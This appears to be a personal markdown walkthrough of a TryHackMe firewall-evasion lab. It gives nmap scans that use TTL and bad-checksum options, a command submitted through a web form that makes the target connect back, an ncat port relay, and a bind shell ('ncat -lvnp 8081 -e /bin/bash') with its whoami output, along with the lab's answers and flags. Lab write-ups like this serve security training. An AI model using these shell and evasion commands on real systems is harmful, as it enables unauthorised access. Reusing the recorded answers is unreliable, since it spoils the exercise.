---
tags:
  - THM
  - Firewall
---
# Firewalls

```bash
ip a s tun0

export IP="10.10.234.211"

ping -c4 $IP
```

## Task 5

```bash
udo nmap -sS -Pn --ttl 81 -F $IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 21:22 CEST
Nmap scan report for 10.10.234.211
Host is up (0.039s latency).
Not shown: 97 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1.98 seconds
```

Answer 2:
>3

```bash
sudo nmap -sS -Pn --badsum -F $IP                                                                                                                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 21:24 CEST
Nmap scan report for 10.10.234.211
Host is up.
All 100 scanned ports on 10.10.234.211 are in ignored states.
Not shown: 100 filtered tcp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 21.33 seconds
```

Answer 3:
> 0

## Task 6

```bash
export IP="10.10.22.198"

ping -c4 $IP

sudo ncat -lvnp 21
```

```bash
# new terminal on atteck box
ip a s tun0

export IP="10.10.22.198"

firefox http://${IP}:8080

```

copy into the input field on the website `ncat ATTACKBOX_IP 21`

## Task 7 

```bash
firefox http://${IP}:8080
```

`ncat -lnvp 8008 -c "ncat 10.10.22.198 80"`

```bash
firefox http://${IP}:8008
```

Answer 1:
>THM{1298331956}

## Task 8

```bash
export IP="10.10.22.198"

firefox http://${IP}:8080 &
```

`ncat -lvnp 8081 -e /bin/bash`

```bash
ncat -vv $IP 8081

whoami
libnsock nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 58 [peer unspecified] (7 bytes): whoami.
libnsock nsock_write(): Write request for 7 bytes to IOD #1 EID 67 [10.10.22.198:8081]
libnsock nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 67 [10.10.22.198:8081]
libnsock nsock_readbytes(): Read request for 0 bytes from IOD #2 [peer unspecified] EID 74
libnsock nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 18 [10.10.22.198:8081] (11 bytes): thmredteam.
thmredteam
```

Answer 1:
> thmredteam